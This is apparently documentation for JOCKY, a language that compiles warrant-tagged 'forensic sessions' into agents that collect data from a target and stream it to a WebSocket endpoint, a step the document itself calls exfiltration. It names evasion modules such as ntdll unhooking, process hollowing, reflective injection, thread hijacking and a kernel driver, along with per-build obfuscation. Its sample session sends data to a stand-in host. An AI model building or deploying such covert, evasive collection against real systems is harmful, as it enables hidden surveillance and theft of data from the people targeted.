# Session Structure

Every JOCKY program is a single `forensic session { }` block. There are no functions, modules, or imports — the language is intentionally flat and declarative.

---

## Full Structure

```jocky
forensic session {
    target:  "<IP_or_hostname>";
    warrant: "<NTRO-YYYY-TYPE-NNNN>";
    collect {
        <artifact_type>: <expression>,
        <artifact_type>: <expression>
    };
    encrypt <algorithm>(key: <key_source>);
    transmit via: "<endpoint>";
}
```

---

## Field Order

Fields **must appear in this order**. The parser is strict about ordering:

| # | Field | Required | Description |
|---|-------|----------|-------------|
| 1 | `target` | Yes | IP address or hostname of the forensic target |
| 2 | `warrant` | Yes | IT Act §69 warrant ID — compile-time error if absent |
| 3 | `collect { }` | Yes | One or more artifact collection directives |
| 4 | `encrypt` | Yes | Encryption algorithm and key source |
| 5 | `transmit` | Yes | WebSocket endpoint for data exfiltration |

All five fields are required. Omitting any one is a compile-time error.

---

## Minimal Valid Session

The smallest session that compiles:

```jocky
forensic session {
    target: "10.0.0.1";
    warrant: "NTRO-2026-TEST-0001";
    collect {
        proc: all_processes
    };
    encrypt aes256(key: hsm_derived);
    transmit via: "wss://server.example/telemetry";
}
```

---

## What the Compiler Generates

For this session the compiler emits LLVM IR that:

1. Allocates a `ForensicContext` structure on the heap with the target, warrant, and session ID.
2. Emits `collect_processes()` — walks `/proc` (Linux) or `NtQuerySystemInformation` (Windows).
3. Emits `encrypt_aes256_gcm()` — wraps collected data in AES-256-GCM with HKDF-derived key.
4. Emits `transmit_wss()` — opens a TLS WebSocket to the specified endpoint and streams data.
5. Stitches in all six runtime modules: NtdllUnhooker, ProcessHollow, ReflectiveInject, ReflectiveLoader, ThreadHijack, KernelDriver.
6. Runs all 7 obfuscation passes over the resulting IR.

The output `.ll` file is different every time you compile the same source — different function names, different CFG layout, different junk block count.
